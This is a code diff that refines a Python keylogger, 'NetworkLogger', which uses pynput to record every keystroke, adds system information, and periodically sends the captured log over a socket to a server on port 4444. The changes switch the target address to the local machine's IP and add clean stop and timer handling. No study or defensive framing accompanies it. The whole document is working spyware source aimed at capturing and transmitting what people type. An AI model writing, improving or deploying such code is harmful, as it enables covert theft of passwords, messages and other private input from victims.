@@ -5,7 +5,19 @@ from pynput import keyboard
 from threading import Timer
 
 # --- Network Configuration ---
-SERVER_IP = "192.168.1.1"   
+def get_local_ip():
+    """Gets the local machine IP address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+    
+    
+SERVER_IP = get_local_ip()   
 SERVER_PORT = 4444
 
 # --- Logging Configuration ---
@@ -17,8 +29,11 @@ class NetworkLogger:
         self.ip = ip
         self.port = port
         self.log = "Network KeyLogger Started...\n"
+        self.timer = None
+        self.running = True
         self.append_system_info()
         self.report()
+    
     def append_log(self, string):
         """Appends new data to the internal log variable."""
         self.log += string
@@ -26,18 +41,18 @@ class NetworkLogger:
     def save_data(self, key):
         """Processes and saves captured keystrokes with cleaner output."""
         
+        if not self.running:
+            return False
+        
         if key == keyboard.Key.esc:
             if len(self.log) > 0:
                 self.send_log_over_network(self.log)
-            
-            self.append_log("\n[KEYLOGGER STOPPED BY ESC KEY]\n")
+            self.running = False
             return False 
         
         try:
             current_key = str(key.char)
-            
         except AttributeError:
-            # Handle special keys for clean output
             if key == keyboard.Key.space:
                 current_key = " "
             elif key == keyboard.Key.enter:
@@ -52,8 +67,6 @@ class NetworkLogger:
                 current_key = " [CTRL] "
             elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                 current_key = " [ALT] "
-            elif key == keyboard.Key.esc:
-                current_key = " [ESC] "
             else:
                 key_name = str(key).split('.')[-1].upper()
                 current_key = f" [{key_name}] "
@@ -81,22 +94,33 @@ class NetworkLogger:
 
     def report(self):
         """Sends the accumulated log data and clears the internal log."""
-        if len(self.log) > 0:
+        if self.running and len(self.log) > 0:
             self.send_log_over_network(self.log)
             self.log = ""
         
-        # Schedule the next report
-        timer = Timer(self.interval, self.report)
-        timer.start()
+        if self.running:
+            self.timer = Timer(self.interval, self.report)
+            self.timer.daemon = True
+            self.timer.start()
+
+    def stop(self):
+        """Stops the keylogger and timer."""
+        self.running = False
+        if self.timer:
+            self.timer.cancel()
+        if len(self.log) > 0:
+            self.send_log_over_network(self.log)
+        print("\n[*] KeyLogger stopped.")
 
     def run(self):
         """Starts the keylogger listener and reporting timer."""
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
-        
-        with keyboard_listener:
-            # The report timer is already started in __init__
-            keyboard_listener.join()
+        keyboard_listener.start()
+        keyboard_listener.join()
             
 if __name__ == "__main__":
     logger = NetworkLogger(REPORT_INTERVAL, SERVER_IP, SERVER_PORT)
-    logger.run()
+    try:
+        logger.run()
+    except KeyboardInterrupt:
+        logger.stop()
